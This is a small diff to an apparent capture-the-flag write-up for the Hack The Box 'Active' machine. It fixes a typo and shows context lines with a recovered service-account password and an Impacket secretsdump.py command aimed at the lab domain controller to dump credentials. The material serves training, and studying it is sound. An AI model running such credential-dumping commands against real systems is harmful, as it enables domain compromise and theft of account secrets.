@@ -200,7 +200,8 @@ GPPstillStandingStrong2k18
  ```
 user => "active.htb\SVC_TGS"
 password=> "GPPstillStandingStrong2k18"
-Tried and failied with the following... 
+
+Tried and failed with the following... 
 ```
 nostromo :: ~ » sudo secretsdump.py active\SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
